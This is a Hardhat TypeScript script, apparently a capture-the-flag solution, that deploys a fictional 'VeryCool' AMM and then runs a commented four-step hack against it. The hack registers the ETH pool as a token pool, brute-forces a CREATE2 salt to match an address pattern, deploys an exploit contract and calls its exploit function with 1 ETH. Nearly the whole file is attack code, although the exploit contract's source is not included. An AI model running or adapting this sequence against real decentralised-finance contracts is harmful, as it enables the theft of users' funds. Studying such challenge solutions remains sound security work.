import { VeryCoolPeryphery } from "../typechain/VeryCoolPeryphery";
import { VeryCoolPoolTokens } from "../typechain/VeryCoolPoolTokens";
import { VeryCoolAMMExploit } from "../typechain/VeryCoolAMMExploit";
import { deploy, DeploymentFlags } from "./utils/deployment";
import { ethers } from "hardhat";

import { findSaltToMatch, PatternFlags } from "./utils/findAddress";
import { BigNumber } from "ethers";
/**
 * Deploy SimpleContract
 */
async function main() {
    // Deploy AMM
    const VeryCoolPeryphery: VeryCoolPeryphery = (await deploy(
        "VeryCoolPeryphery",
        [
            "0x596b40b23aEdda314AfD810a76bC97B18e2A084E",
            "0xe5Fe0148D91567591EC859cBb2F8bC03803Bfc7d",
            "0x00000000e82eb0431756271F0d00CFB143685e7B",
        ],
        DeploymentFlags.Deploy,
    )) as VeryCoolPeryphery;
    console.log(`VeryCoolPeryphery deployed at ${VeryCoolPeryphery.address}`);

    // Deploy token pool
    const VeryCoolPoolTokens: VeryCoolPoolTokens = (await deploy(
        "VeryCoolPoolTokens",
        ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "0xdAC17F958D2ee523a2206206994597C13D831ec7"],
        DeploymentFlags.Deploy,
    )) as VeryCoolPoolTokens;
    console.log(`VeryCoolPoolTokens deployed at ${VeryCoolPoolTokens.address}`);

    // Add new token pool
    await VeryCoolPeryphery.addTokenPool(VeryCoolPoolTokens.address);

    /*
        HACK!!!
     */

    // Hack Step 1: Register ETH pool as token pool
    const VeryCoolPoolETHAddress = await VeryCoolPeryphery.defaultETHPool();
    await VeryCoolPeryphery.addTokenPool(VeryCoolPoolETHAddress);

    // Hack Step 2: Find Salt for Exploit Address
    const VeryCoolAMMExploitFactory = await ethers.getContractFactory("VeryCoolAMMExploit");
    const VeryCoolAMMExploitBytecode = VeryCoolAMMExploitFactory.bytecode;

    const [salt, address] = findSaltToMatch(
        "0x00000000e82eb0431756271F0d00CFB143685e7B",
        VeryCoolAMMExploitBytecode,
        "00000000",
        "0x000000000000000000000000000000000000000000000000000000004dcd27b5",
        PatternFlags.FromStart,
    );

    console.log(`Salt: ${salt}, Address:${address}`);

    // Hack Step 3: Deploy Exploit using Salt
    const VeryCoolAMMExploit: VeryCoolAMMExploit = (await deploy(
        "VeryCoolAMMExploit",
        [],
        DeploymentFlags.Deploy,
    )) as VeryCoolAMMExploit;

    console.log(`VeryCoolAMMExploit deployed at ${VeryCoolAMMExploit.address}`);

    // Hack Step 4: Profit!
    const valueETH: BigNumber = ethers.utils.parseEther("1");
    await VeryCoolAMMExploit.exploit(VeryCoolPeryphery.address, VeryCoolPoolETHAddress, 2, { value: valueETH });
}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });
